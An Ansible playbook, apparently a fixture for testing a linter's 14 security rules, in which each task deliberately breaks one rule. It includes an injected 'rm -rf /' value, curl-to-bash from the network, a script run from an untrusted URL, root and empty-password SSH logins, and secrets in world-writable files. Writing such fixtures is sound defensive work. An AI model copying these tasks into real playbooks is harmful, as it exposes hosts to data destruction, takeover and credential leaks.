- name: Comprehensive Playbook for Testing All 14 Security Rules (Simplified)
  hosts: all
  become: yes
  vars:
    user_input: "malicious; rm -rf /"
    user_command: "echo 'hacked'"
    user_data: "secret_password_123"
    db_password: "my_plaintext_password"
    app_version: "latest"
    
  tasks:
    # ANS001: Использование command для управления службами
    - name: Restart nginx with command module (ANS001 VIOLATION)
      command: systemctl restart nginx

    # ANS002: changed_when без when
    - name: Check service status with changed_when only (ANS002 VIOLATION)
      command: systemctl is-active nginx
      register: nginx_status
      changed_when: "'inactive' in nginx_status.stdout"

    # ANS003: Задача без имени
    - name:  # ANS003 VIOLATION - пустое имя
      command: echo "anonymous task"

    # ANS004: Использование sudo в командах
    - name: Update packages with sudo (ANS004 VIOLATION)
      shell: sudo apt-get update

    # ANS005: Использование устаревшего модуля raw
    - name: Execute raw command (ANS005 VIOLATION)
      raw: yum update -y

    # ANS006: Файлы без указания прав доступа
    - name: Create config file without permissions (ANS006 VIOLATION)
      copy:
        content: "SECRET_KEY=abc123"
        dest: /etc/app/config.env

    # ANS007: Отключение SSL проверки
    - name: Download without SSL verification (ANS007 VIOLATION)
      get_url:
        url: https://self-signed-cert.com/package.deb
        dest: /tmp/package.deb
        validate_certs: no

    # ANS008: Установка пакетов без версий
    - name: Install packages without version (ANS008 VIOLATION)
      apt:
        name: 
          - nginx
          - nodejs
        state: present

    # ANS009: Небезопасная конфигурация SSH
    - name: Configure insecure SSH settings (ANS009 VIOLATION)
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?PermitRootLogin'
        line: 'PermitRootLogin yes'

    # ANS010: Инъекция команд
    - name: Process user input unsafely (ANS010 VIOLATION)
      command: "echo {{ user_input }} > /tmp/output.log"

    # ANS011: Небезопасная работа с временными файлами (упрощенное)
    - name: Create world-writable temp file with secrets (ANS011 VIOLATION)
      copy:
        content: "DB_PASSWORD={{ db_password }}"
        dest: /tmp/database.conf
        mode: '0777'

    # ANS012: Небезопасное выполнение скриптов
    - name: Run script from untrusted source (ANS012 VIOLATION)
      script: http://untrusted-site.com/deploy.sh
      args: "{{ user_data }}"

    # ANS013: Загрузка и выполнение кода
    - name: Download and execute pattern (ANS013 VIOLATION)
      shell: |
        curl http://example.com/install.sh | bash

    # ANS014: Использование опасных функций
    - name: Execute dynamic Python code (ANS014 VIOLATION)
      command: |
        python -c "exec('print(\\\"{{ user_command }}\\\")')"

    # Дополнительные примеры для ANS011
    - name: Create temp file in /var/tmp with secrets (ANS011 VIOLATION)
      copy:
        content: "API_KEY=sk-1234567890"
        dest: /var/tmp/api_keys.txt
        mode: '0666'

    - name: Command writing secrets to /tmp (ANS011 VIOLATION)
      shell: echo "SECRET_TOKEN=abc123def456" > /tmp/token.txt

    # Дополнительные примеры для других правил
    - name: Another command injection example (ANS010 VIOLATION)
      shell: "cat /var/log/{{ user_input }}"

    - name: More insecure SSH config (ANS009 VIOLATION)
      blockinfile:
        path: /etc/ssh/sshd_config
        block: |
          PasswordAuthentication yes
          PermitEmptyPasswords yes

    - name: Install outdated specific version (ANS008 related)
      apt:
        name: python2.7=2.7.18
        state: present